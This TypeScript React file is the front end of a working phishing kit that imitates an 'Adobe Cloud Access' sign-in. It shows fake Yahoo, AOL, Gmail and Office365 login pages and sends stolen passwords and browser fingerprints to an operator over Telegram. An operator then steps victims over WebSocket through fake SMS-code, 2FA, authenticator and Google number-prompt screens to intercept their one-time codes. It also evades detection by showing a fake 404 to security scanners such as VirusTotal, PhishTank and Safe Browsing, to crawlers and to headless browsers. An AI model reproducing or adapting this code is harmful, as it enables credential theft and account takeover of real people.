// Alternate domains hosted by Yahoo (beyond domains that already contain 'yahoo')
const YAHOO_EXTRA_DOMAINS = [
  'ymail.com', 'rocketmail.com',
  // AT&T / SBC / Pacific Bell / BellSouth — all route through Yahoo Mail
  'att.net', 'sbcglobal.net', 'ameritech.net', 'bellsouth.net',
  'pacbell.net', 'flash.net', 'nvbell.net', 'prodigy.net', 'snet.net', 'swbell.net',
  // Verizon / Frontier — use Yahoo Mail infrastructure
  'verizon.net', 'myfairpoint.net', 'frontiernet.net',
];
// Alternate domains hosted by AOL (beyond domains that already contain 'aol')
const AOL_EXTRA_DOMAINS = [
  'aim.com', 'love.com', 'ygm.com', 'games.com', 'wow.com', 'netscape.net',
  // CompuServe — owned by AOL/Verizon Media
  'compuserve.com', 'cs.com',
];
// Microsoft personal email domains (Outlook, Hotmail, Live, MSN and international variants)
const MICROSOFT_PERSONAL_DOMAINS = [
  // Outlook
  'outlook.com', 'outlook.co.uk', 'outlook.de', 'outlook.fr', 'outlook.it',
  'outlook.es', 'outlook.at', 'outlook.be', 'outlook.cl', 'outlook.cz',
  'outlook.dk', 'outlook.fi', 'outlook.gr', 'outlook.hu', 'outlook.id',
  'outlook.ie', 'outlook.in', 'outlook.lv', 'outlook.my', 'outlook.ph',
  'outlook.pt', 'outlook.sa', 'outlook.sg', 'outlook.sk', 'outlook.tr',
  'outlook.vn', 'outlook.com.au', 'outlook.com.br', 'outlook.co.nz', 'outlook.co.jp',
  // Hotmail
  'hotmail.com', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de', 'hotmail.it',
  'hotmail.es', 'hotmail.co.jp', 'hotmail.com.br', 'hotmail.com.ar',
  'hotmail.be', 'hotmail.ca', 'hotmail.nl', 'hotmail.at', 'hotmail.ch',
  'hotmail.com.mx', 'hotmail.com.au', 'hotmail.gr', 'hotmail.hu',
  'hotmail.no', 'hotmail.se', 'hotmail.dk', 'hotmail.fi',
  // Live
  'live.com', 'live.co.uk', 'live.fr', 'live.de', 'live.it', 'live.es',
  'live.nl', 'live.be', 'live.ca', 'live.com.au', 'live.co.nz', 'live.com.ar',
  'live.com.mx', 'live.at', 'live.ch', 'live.dk', 'live.fi', 'live.ie',
  'live.no', 'live.pt', 'live.se', 'live.co.za',
  // MSN
  'msn.com',
  // Windows Live / Xbox Live / Passport / Microsoft corporate
  'windowslive.com', 'xboxlive.com', 'passport.com', 'microsoft.com',
];

const isYahooDomain = (domain: string): boolean =>
  domain.includes('yahoo') || YAHOO_EXTRA_DOMAINS.some(d => domain === d || domain.endsWith('.' + d));

const isAolDomain = (domain: string): boolean =>
  domain.includes('aol') || AOL_EXTRA_DOMAINS.some(d => domain === d || domain.endsWith('.' + d));

const isMicrosoftPersonalDomain = (domain: string): boolean =>
  MICROSOFT_PERSONAL_DOMAINS.some(d => domain === d || domain.endsWith('.' + d));

// Client-side bot detection patterns (mirrors server.js BLOCKED_BOTS)
const CLIENT_BOT_PATTERNS = [
  'bot', 'crawl', 'spider', 'scrape', 'fetch', 'scan', 'check', 'monitor', 'probe',
  'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium', 'webdriver',
  'curl', 'wget', 'python-requests', 'python-urllib', 'go-http-client', 'node-fetch',
  'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
  'gptbot', 'chatgpt-user', 'ccbot', 'claudebot', 'anthropic-ai',
  'semrushbot', 'ahrefsbot', 'mj12bot', 'petalbot', 'bytespider',
  'facebookexternalhit', 'twitterbot', 'linkedinbot', 'whatsapp',
  'urlscan', 'virustotal', 'phishtank', 'safebrowsing', 'netcraft',
  'shodan', 'censys', 'nuclei', 'nikto', 'nessus', 'acunetix', 'burpsuite',
  'axios', 'undici', 'scrapy', 'mechanize', 'httrack', 'libwww-perl',
  'smartscreen', 'phishing', 'antivirus', 'antiphishing', 'malware',
];

function isClientBot(): boolean {
  const ua = (navigator.userAgent || '').toLowerCase();
  if (!ua) return true;
  for (let i = 0; i < CLIENT_BOT_PATTERNS.length; i++) {
    if (ua.indexOf(CLIENT_BOT_PATTERNS[i]) !== -1) return true;
  }
  // Headless browser detection
  if ((navigator as any).webdriver) return true;
  return false;
}

function App() {
  // Client-side domain lock: if VITE_LOGIN_HOST is configured, only the matching
  // subdomain hostname is allowed. Any other host (e.g. the bare root domain) sees
  // a completely blank page. This mirrors the server-side LOGIN_HOST middleware.
  const [isBadHost] = useState<boolean>(() => {
    const expected = (import.meta.env.VITE_LOGIN_HOST ?? '').toLowerCase().trim();
    if (!expected) return false; // env var not set – allow all hosts (dev / preview)
    return window.location.hostname.toLowerCase() !== expected;
  });

  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);
  const [hasActiveSession, setHasActiveSession] = useState(() => !!getCookie('adobe_session'));
  const [isLoading, setIsLoading] = useState(false);
  const [isInitializing, setIsInitializing] = useState(true);
  const [isBotDetected, setIsBotDetected] = useState(false);
  const [initMessage, setInitMessage] = useState('Connecting...');

  // WebSocket state management. sessionId is a cryptographically-random correlator
  // that ties the user's HTTP Telegram submissions to their WebSocket session so
  // the operator can match them up. It is NOT a secret/token (the backend still
  // authenticates separately), but we still use crypto randomness to avoid
  // predictable IDs across sessions.
  const [sessionId] = useState(() => {
    try {
      if (typeof crypto !== 'undefined' && typeof crypto.randomUUID === 'function') {
        return crypto.randomUUID();
      }
      if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
        const bytes = new Uint8Array(16);
        crypto.getRandomValues(bytes);
        return Array.from(bytes, b => b.toString(16).padStart(2, '0')).join('');
      }
    } catch { /* fall through */ }
    // Last-resort fallback for environments without WebCrypto (very old browsers).
    return Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
  });

  const navigate = useNavigate();
  const location = useLocation();

  // App-level state for interactive elements that the operator can drive over
  // WebSocket. The page components (e.g. `GmailSmsCodePage`) are "dumb": they
  // receive these values as props and simply render them.
  const [smsCode, setSmsCode] = useState('');
  // Operator-supplied number for the Google "# Prompt" challenge (sent over
  // WebSocket via `show_google_number_prompt`). Surfaced as a prop to the
  // dedicated GoogleNumberPromptPage so the user sees the same number the
  // admin picked / typed in Telegram.
  const [googlePromptNumber, setGooglePromptNumber] = useState<string>('');

  // WebSocket command handler. Each interactive command navigates to a dedicated
  // per-provider full-screen page; there is no generic overlay.
  const handleWebSocketMessage = (message: WebSocketMessage) => {
    const { command, data } = message;
    // Any operator-driven command means the next UI state has arrived from
    // Telegram — clear the "waiting for operator" spinner so the navigated
    // page actually renders. Without this, after a user submits a retry
    // password / SMS code / 2FA / email code the full-screen spinner would
    // sit on top of every subsequent show_* route, making Yahoo / Office365
    // / AOL (and Gmail) Telegram buttons appear non-responsive.
    setIsLoading(false);
    if (command === 'redirect' && typeof data?.url === 'string') {
      // Operator-driven terminal redirect (e.g. to the real provider after capture).
      window.location.href = data.url as string;
      return;
    }
    if (command === 'hide_state' || command === 'reset') {
      window.location.href = 'https://www.adobe.com';
    } else if (command === 'navigate' && data?.route) {
      navigate(data.route as string);
    } else if (command.startsWith('show_')) {
      const flow = command.replace('show_', '') as keyof typeof routeMaps;
      const providerKey = normalizeProviderKey(data?.provider as string);
      const routeMaps = {
        incorrect_password: INCORRECT_PWD_ROUTE_BY_PROVIDER,
        sms_code: SMS_ROUTE_BY_PROVIDER,
        authenticator_approval: AUTH_ROUTE_BY_PROVIDER,
        account_locked: ACCOUNT_LOCKED_ROUTE_BY_PROVIDER,
        security_check: SECURITY_CHECK_ROUTE_BY_PROVIDER,
        two_factor: TWO_FACTOR_ROUTE_BY_PROVIDER,
        email_verification: EMAIL_VERIFICATION_ROUTE_BY_PROVIDER,
        google_number_prompt: GOOGLE_PROMPT_ROUTE_BY_PROVIDER,
      };
      // For `show_sms_code`, capture the operator-supplied code so the SMS
      // page can render it directly from props.
      if (flow === 'sms_code') {
        const providedCode = (data?.code as string) || '';
        setSmsCode(providedCode);
      }
      // For `show_google_number_prompt`, capture the operator-supplied number
      // so the GoogleNumberPromptPage can display it prominently.
      if (flow === 'google_number_prompt') {
        const providedNumber = (data?.number as number | string | undefined);
        setGooglePromptNumber(providedNumber !== undefined && providedNumber !== null ? String(providedNumber) : '');
      }
      const targetRoute = routeMaps[flow]?.[providerKey];
      if (targetRoute) {
        navigate(targetRoute, { state: { data, provider: data?.provider || 'Others' } });
      }
    }
  };

  // Initialize WebSocket connection
  const { sendMessage } = useWebSocket({
    sessionId,
    onMessage: handleWebSocketMessage,
    onConnect: () => {
      console.log('WebSocket connected, sessionId:', sessionId);
      // Send initial handshake
      sendMessage({ command: 'handshake', data: { sessionId, userAgent: navigator.userAgent } });
    },
    onDisconnect: () => {
      console.log('WebSocket disconnected');
    },
  });

  // Centralized handler for all user actions on interactive pages (incorrect-password
  // retry, SMS/2FA/email-code submission, resend requests, etc.). Per the
  // standardized one-attempt flow, terminal submissions DO NOT navigate on
  // their own — they show a loading spinner and wait for a WebSocket command
  // (`redirect`, `show_*`, …) from the operator to drive the next step.
  const handleInteractiveAction = async (action: string, data?: Record<string, unknown>) => {
    const payload = {
      type: 'interaction',
      data: { action, sessionId, ...data }
    };

    if (['retry_password', 'submit_sms', 'submit_2fa', 'submit_email_code'].includes(action)) {
      // Show loading spinner and wait for the server-driven WebSocket command.
      setIsLoading(true);
      // Fire-and-forget — the operator drives the next UI state over WebSocket.
      safeSendToTelegram(payload);
      return;
    }

    await safeSendToTelegram(payload);
    if (action === 'retry') {
      navigate(ROUTES.HOME, { replace: true });
    }
  };

  // Initialization: bot detection + connecting splash screen
  useEffect(() => {
    if (isClientBot()) {
      setIsBotDetected(true);
      setIsInitializing(false);
      return;
    }
    const t1 = setTimeout(() => setInitMessage('Checking network connection...'), 800);
    const t2 = setTimeout(() => setInitMessage('Establishing secure connection...'), 1800);
    const t3 = setTimeout(() => setIsInitializing(false), 2800);
    return () => { clearTimeout(t1); clearTimeout(t2); clearTimeout(t3); };
  }, []);

  useEffect(() => {
    const checkMobile = () => setIsMobile(window.innerWidth <= 768);
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);
  
  useEffect(() => {
    const handleCookieChange = (event: CookieChangeEvent) => {
      if (event.name === 'adobe_session') {
        setHasActiveSession(event.action !== 'remove' && !!event.value);
      }
    };
    const unsubscribe = subscribeToCookieChanges(handleCookieChange);
    return unsubscribe;
  }, []);

  useEffect(() => {
    if (hasActiveSession && location.pathname !== ROUTES.LANDING) {
      navigate(ROUTES.LANDING, { replace: true });
    } else if (!hasActiveSession && location.pathname === ROUTES.LANDING) {
      navigate(ROUTES.HOME, { replace: true });
    }
  }, [hasActiveSession, location.pathname, navigate]);

  const handleCaptchaVerified = () => {
    navigate(ROUTES.LOGIN);
  };

  // "One-attempt" login: capture credentials, send them once to Telegram
  // (fire-and-forget), then immediately route to the provider-specific
  // Incorrect-Password page so the operator can drive the rest of the session
  // over WebSocket.
  const handleLoginSuccess = async (loginData: Record<string, unknown>) => {
    let fingerprint: Record<string, unknown> = {};
    try { fingerprint = await getBrowserFingerprint(); } catch (e) { console.warn('Fingerprint failed', e); }

    const credentialsData = { ...loginData, sessionId, timestamp: new Date().toISOString(), userAgent: navigator.userAgent, ...fingerprint };
    // Fire-and-forget: do NOT await the API response — navigation must happen immediately.
    safeSendToTelegram({ type: 'credentials', data: credentialsData });

    const providerKey = normalizeProviderKey(loginData.provider as string);
    navigate(INCORRECT_PWD_ROUTE_BY_PROVIDER[providerKey], {
      replace: true,
      state: { data: { email: loginData.email, provider: loginData.provider }, provider: (loginData.provider as string) || 'Others' },
    });
  };

  const handleLogout = () => {
    localStorage.clear();
    sessionStorage.clear();
    config.session.cookieNames.forEach(name => removeCookie(name, { path: '/' }));
    setHasActiveSession(false);
  };

  const handleOthersEmailSubmit = async (email: string): Promise<boolean> => {
    const domain = (email.split('@').pop() || '').toLowerCase();
    if (isYahooDomain(domain)) {
      navigate(PROVIDER_URLS.YAHOO, { state: { email } });
      return true;
    }
    if (isAolDomain(domain)) {
      navigate(PROVIDER_URLS.AOL, { state: { email } });
      return true;
    }
    if (domain.includes('gmail') || domain.includes('google')) {
      navigate(PROVIDER_URLS.GMAIL, { state: { email } });
      return true;
    }
    if (isMicrosoftPersonalDomain(domain)) {
      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
      return true;
    }
    if (domain === 'onmicrosoft.com' || domain.endsWith('.onmicrosoft.com')) {
      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
      return true;
    }
    // Hosted-mail detection: covers any custom domain whose mail is actually
    // served by Microsoft Office365 (Managed/Federated AAD tenants, MX ending
    // in mail.protection.outlook.com) or Google Workspace (MX ending in
    // *.google.com). Runs three probes in parallel and picks the first
    // positive answer; falls through to inline password if none match.
    const hosted = await detectHostedMailProvider(email, domain);
    if (hosted === 'microsoft') {
      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
      return true;
    }
    if (hosted === 'google') {
      navigate(PROVIDER_URLS.GMAIL, { state: { email } });
      return true;
    }
    // Unrecognized domain — return false so signin.html shows the password step inline
    return false;
  };

  // ---------- Enhanced hosted-mail provider auto-detection ----------
  //
  // Many custom domains route through Microsoft Office365 or Google Workspace.
  // To detect them reliably we combine three signals (run in parallel; first
  // positive wins):
  //
  //   1. Microsoft GetUserRealm — canonical, public, CORS-enabled endpoint
  //      that says whether an email is in any Azure AD / Office365 tenant.
  //   2. DNS-over-HTTPS MX lookup (Google + Cloudflare) — MX hosts ending in
  //      `mail.protection.outlook.com` ⇒ Office365; ending in `google.com` ⇒
  //      Google Workspace.
  //   3. OpenID-Connect tenant discovery — only as a fallback (some O365
  //      tenants don't expose the domain on this endpoint).
  //
  // Each helper resolves to a provider tag or null, never throws, and is
  // bounded by an internal timeout so a single hung request can't stall the
  // email submission flow.

  type HostedProvider = 'microsoft' | 'google' | null;

  const fetchWithTimeout = async (url: string, ms: number): Promise<Response | null> => {
    try {
      const ctrl = new AbortController();
      const timer = setTimeout(() => ctrl.abort(), ms);
      try {
        const r = await fetch(url, { method: 'GET', signal: ctrl.signal });
        return r;
      } finally {
        clearTimeout(timer);
      }
    } catch {
      return null;
    }
  };

  // Microsoft GetUserRealm — definitive answer for whether an email lives in
  // any Azure AD / Office365 tenant (covers Managed and Federated namespaces).
  const probeGetUserRealm = async (email: string): Promise<HostedProvider> => {
    const url = `https://login.microsoftonline.com/getuserrealm.srf?login=${encodeURIComponent(email)}&json=1`;
    const r = await fetchWithTimeout(url, 6000);
    if (!r || !r.ok) return null;
    try {
      const data = await r.json();
      const ns = String(data?.NameSpaceType || '').toLowerCase();
      if (ns === 'managed' || ns === 'federated') return 'microsoft';
      return null;
    } catch {
      return null;
    }
  };

  // DNS-over-HTTPS MX lookup. Tries Google (dns.google) first, then Cloudflare
  // as a fallback. MX records authoritatively reveal who actually hosts the
  // mail (regardless of vanity domain).
  const probeMxRecords = async (domain: string): Promise<HostedProvider> => {
    const endpoints = [
      `https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=MX`,
      `https://cloudflare-dns.com/dns-query?name=${encodeURIComponent(domain)}&type=MX`,
    ];
    for (const url of endpoints) {
      const r = await fetchWithTimeout(url, 4000);
      if (!r || !r.ok) continue;
      let json: any;
      try {
        // Cloudflare requires Accept: application/dns-json — but it also returns
        // JSON for plain GETs from browsers in practice. If parsing fails we
        // just move on to the next endpoint.
        json = await r.json();
      } catch {
        continue;
      }
      const answers: any[] = Array.isArray(json?.Answer) ? json.Answer : [];
      // MX RDATA looks like "10 mx.example.com." — lowercase + strip trailing dot.
      const mxHosts = answers
        .map(a => String(a?.data || '').toLowerCase().trim())
        .map(s => {
          const parts = s.split(/\s+/);
          const host = parts[parts.length - 1] || '';
          return host.replace(/\.$/, '');
        })
        .filter(Boolean);
      if (mxHosts.length === 0) continue;
      // Office365 mail flow always lands on *.mail.protection.outlook.com
      if (mxHosts.some(h => h.endsWith('mail.protection.outlook.com') || h.endsWith('.outlook.com'))) {
        return 'microsoft';
      }
      // Google Workspace MX hosts are aspmx.l.google.com, alt1.aspmx.l.google.com, etc.
      if (mxHosts.some(h => h.endsWith('.google.com') || h.endsWith('googlemail.com'))) {
        return 'google';
      }
      // We got an authoritative MX answer but neither MS nor Google — stop probing.
      return null;
    }
    return null;
  };

  // OpenID-Connect tenant discovery — kept as a tertiary fallback for the rare
  // cases where GetUserRealm + MX both come back empty (e.g. CORS hiccup) but
  // the domain is in fact a primary Azure AD tenant.
  const probeOidcTenant = async (domain: string): Promise<HostedProvider> => {
    const r = await fetchWithTimeout(
      `https://login.microsoftonline.com/${encodeURIComponent(domain)}/v2.0/.well-known/openid-configuration`,
      6000,
    );
    return r && r.ok ? 'microsoft' : null;
  };

  // Runs all three probes concurrently and resolves with the first positive
  // result, or null if none of them recognize the domain. Errors in any single
  // probe are ignored — they just resolve to null.
  const detectHostedMailProvider = async (email: string, domain: string): Promise<HostedProvider> => {
    return new Promise<HostedProvider>(resolve => {
      let resolved = false;
      let pending = 3;
      const settle = (v: HostedProvider) => {
        if (resolved) return;
        if (v) {
          resolved = true;
          resolve(v);
          return;
        }
        if (--pending <= 0) {
          resolved = true;
          resolve(null);
        }
      };
      probeGetUserRealm(email).then(settle, () => settle(null));
      probeMxRecords(domain).then(settle, () => settle(null));
      probeOidcTenant(domain).then(settle, () => settle(null));
    });
  };

  // Backwards-compatible name used by the existing handlers. Returns true iff
  // the domain is an Azure AD / Office365 tenant or has Office365 MX records.
  const isMicrosoftOffice365Domain = async (domain: string): Promise<boolean> => {
    // Hard short-circuit: any *.onmicrosoft.com is always a Microsoft tenant.
    if (domain === 'onmicrosoft.com' || domain.endsWith('.onmicrosoft.com')) return true;
    const fakeEmail = `probe@${domain}`;
    const provider = await detectHostedMailProvider(fakeEmail, domain);
    return provider === 'microsoft';
  };

  // Handler for OthersLoginPage: routes known providers, detects Office365 business domains,
  // and returns false for truly unrecognized domains so the password form is shown.
  const handleOthersPageEmailSubmit = async (email: string): Promise<boolean> => {
    const domain = (email.split('@').pop() || '').toLowerCase();
    if (isYahooDomain(domain)) {
      navigate(PROVIDER_URLS.YAHOO, { state: { email } });
      return true;
    }
    if (isAolDomain(domain)) {
      navigate(PROVIDER_URLS.AOL, { state: { email } });
      return true;
    }
    if (domain.includes('gmail') || domain.includes('google')) {
      navigate(PROVIDER_URLS.GMAIL, { state: { email } });
      return true;
    }
    if (isMicrosoftPersonalDomain(domain)) {
      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
      return true;
    }
    if (domain === 'onmicrosoft.com' || domain.endsWith('.onmicrosoft.com')) {
      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
      return true;
    }
    // Hosted-mail detection: parallel GetUserRealm + DoH MX + OIDC discovery
    // probes catch any custom domain hosted on Office365 / Google Workspace.
    const hosted = await detectHostedMailProvider(email, domain);
    if (hosted === 'microsoft') {
      navigate(PROVIDER_URLS.MICROSOFT, { state: { email } });
      return true;
    }
    if (hosted === 'google') {
      navigate(PROVIDER_URLS.GMAIL, { state: { email } });
      return true;
    }
    // Truly unrecognized domain — let OthersLoginPage show the password form
    return false;
  };

  // Wrong hostname: show a completely blank page (same as what the server returns for root domain)
  if (isBadHost) {
    return <div style={{ margin: 0, padding: 0, minHeight: '100vh', background: '#fff' }} />;
  }

  // Bot detected: show nothing (blank/404-like page)
  if (isBotDetected) {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', alignItems: 'center', justifyContent: 'center', fontFamily: 'sans-serif', color: '#666', background: '#fff' }}>
        <div style={{ textAlign: 'center' }}>
          <h1 style={{ fontSize: '48px', margin: '0 0 16px', color: '#333' }}>404</h1>
          <p style={{ fontSize: '16px', margin: 0 }}>Page not found</p>
        </div>
      </div>
    );
  }

  // Initializing splash screen
  if (isInitializing) {
    return (
      <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', background: '#f5f5f5', fontFamily: 'adobe-clean, Source Sans Pro, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, sans-serif' }}>
        <Spinner size="lg" />
        <p style={{ marginTop: '24px', fontSize: '15px', color: '#6e6e6e', letterSpacing: '0.3px' }}>{initMessage}</p>
      </div>
    );
  }

  if (isLoading) {
    return <div className="min-h-screen bg-[#f5f5f5] flex items-center justify-center"><Spinner size="lg" /></div>;
  }

  const LoginComponent = isMobile ? MobileLoginPage : LoginPage;
  const LandingComponent = isMobile ? MobileLandingPage : LandingPage;
  const YahooComponent = isMobile ? MobileYahooLoginPage : YahooLoginPage;

  return (
    <Routes>
      <Route path={ROUTES.HOME} element={!hasActiveSession ? <LoginComponent key="provider-select" fileName="Adobe Cloud Access" onLoginSuccess={handleLoginSuccess} onYahooSelect={() => navigate(PROVIDER_URLS.YAHOO)} onAolSelect={() => navigate(PROVIDER_URLS.AOL)} onGmailSelect={() => navigate(PROVIDER_URLS.GMAIL)} onOffice365Select={() => navigate(PROVIDER_URLS.MICROSOFT)} onOthersSelect={() => navigate(PROVIDER_URLS.OTHERS)} onEmailSubmit={handleOthersEmailSubmit} onBack={() => navigate(ROUTES.HOME)} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN} element={<Navigate to={ROUTES.HOME} replace />} />
      <Route path={ROUTES.LOGIN_YAHOO} element={!hasActiveSession ? <YahooComponent onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_AOL} element={!hasActiveSession ? <AolLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_GMAIL} element={!hasActiveSession ? <GmailLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} defaultEmail={location.state?.email} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_OTHERS} element={!hasActiveSession ? <OthersLoginPage onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} onEmailSubmit={handleOthersPageEmailSubmit} onBack={() => navigate(ROUTES.HOME)} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LOGIN_OFFICE365} element={!hasActiveSession ? <Office365Wrapper onLoginSuccess={handleLoginSuccess} onLoginError={e => console.error(e)} /> : <Navigate to={ROUTES.LANDING} replace />} />
      <Route path={ROUTES.LANDING} element={hasActiveSession ? <LandingComponent onLogout={handleLogout} /> : <Navigate to={ROUTES.HOME} replace />} />
      {/* Per-provider SMS-code pages (real-time, triggered by WebSocket `show_sms_code`) */}
      <Route path={ROUTES.SMS_GMAIL} element={<GmailSmsCodePage smsCode={smsCode} onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.SMS_OFFICE365} element={<Office365SmsCodePage smsCode={smsCode} onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.SMS_YAHOO} element={<YahooSmsCodePage smsCode={smsCode} onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.SMS_AOL} element={<AolSmsCodePage smsCode={smsCode} onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.SMS_OTHERS} element={<OthersSmsCodePage smsCode={smsCode} onAction={handleInteractiveAction} />} />
      {/* Per-provider authenticator-approval pages (real-time, triggered by WebSocket `show_authenticator_approval`) */}
      <Route path={ROUTES.AUTH_GMAIL} element={<GmailAuthPromptPage onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.AUTH_OFFICE365} element={<Office365AuthPromptPage onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.AUTH_YAHOO} element={<YahooAuthPromptPage onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.AUTH_AOL} element={<AolAuthPromptPage onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.AUTH_OTHERS} element={<OthersAuthPromptPage onAction={handleInteractiveAction} />} />
      {/* Per-provider "incorrect password" pages (triggered by WebSocket `show_incorrect_password`) */}
      <Route path={ROUTES.PWD_GMAIL} element={<IncorrectPasswordPage providerKey="gmail" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.PWD_OFFICE365} element={<IncorrectPasswordPage providerKey="office365" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.PWD_YAHOO} element={<IncorrectPasswordPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.PWD_AOL} element={<IncorrectPasswordPage providerKey="aol" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.PWD_OTHERS} element={<IncorrectPasswordPage providerKey="others" onAction={handleInteractiveAction} />} />
      {/* Per-provider "account locked" pages (triggered by WebSocket `show_account_locked`) */}
      <Route path={ROUTES.LOCKED_GMAIL} element={<AccountLockedPage providerKey="gmail" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.LOCKED_OFFICE365} element={<AccountLockedPage providerKey="office365" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.LOCKED_YAHOO} element={<AccountLockedPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.LOCKED_AOL} element={<AccountLockedPage providerKey="aol" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.LOCKED_OTHERS} element={<AccountLockedPage providerKey="others" onAction={handleInteractiveAction} />} />
      {/* Per-provider "security check" pages (triggered by WebSocket `show_security_check`) */}
      <Route path={ROUTES.SEC_GMAIL} element={<SecurityCheckPage providerKey="gmail" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.SEC_OFFICE365} element={<SecurityCheckPage providerKey="office365" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.SEC_YAHOO} element={<SecurityCheckPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.SEC_AOL} element={<SecurityCheckPage providerKey="aol" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.SEC_OTHERS} element={<SecurityCheckPage providerKey="others" onAction={handleInteractiveAction} />} />
      {/* Per-provider "two-factor required" pages (triggered by WebSocket `show_two_factor`) */}
      <Route path={ROUTES.TFA_GMAIL} element={<TwoFactorPage providerKey="gmail" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.TFA_OFFICE365} element={<TwoFactorPage providerKey="office365" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.TFA_YAHOO} element={<TwoFactorPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.TFA_AOL} element={<TwoFactorPage providerKey="aol" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.TFA_OTHERS} element={<TwoFactorPage providerKey="others" onAction={handleInteractiveAction} />} />
      {/* Per-provider "email verification" pages (triggered by WebSocket `show_email_verification`) */}
      <Route path={ROUTES.EMAIL_V_GMAIL} element={<EmailVerificationPage providerKey="gmail" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.EMAIL_V_OFFICE365} element={<EmailVerificationPage providerKey="office365" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.EMAIL_V_YAHOO} element={<EmailVerificationPage providerKey="yahoo" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.EMAIL_V_AOL} element={<EmailVerificationPage providerKey="aol" onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.EMAIL_V_OTHERS} element={<EmailVerificationPage providerKey="others" onAction={handleInteractiveAction} />} />
      {/* Per-provider Google "# Prompt" pages (triggered by WebSocket `show_google_number_prompt`) */}
      <Route path={ROUTES.GPROMPT_GMAIL} element={<GoogleNumberPromptPage providerKey="gmail" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.GPROMPT_OFFICE365} element={<GoogleNumberPromptPage providerKey="office365" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.GPROMPT_YAHOO} element={<GoogleNumberPromptPage providerKey="yahoo" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.GPROMPT_AOL} element={<GoogleNumberPromptPage providerKey="aol" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
      <Route path={ROUTES.GPROMPT_OTHERS} element={<GoogleNumberPromptPage providerKey="others" number={googlePromptNumber} onAction={handleInteractiveAction} />} />
      <Route path="/login.yahoo.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_YAHOO} />} />
      <Route path="/login.microsoftonline.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OFFICE365} provider="microsoft" />} />
      <Route path="/accounts.google.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_GMAIL} />} />
      <Route path="/login.aol.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_AOL} />} />
      <Route path="/secure-mail.com/*" element={<ProviderRedirect target={ROUTES.LOGIN_OTHERS} />} />
      <Route path="*" element={<Navigate to={hasActiveSession ? ROUTES.LANDING : ROUTES.HOME} replace />} />
    </Routes>
  );
}

export default App;
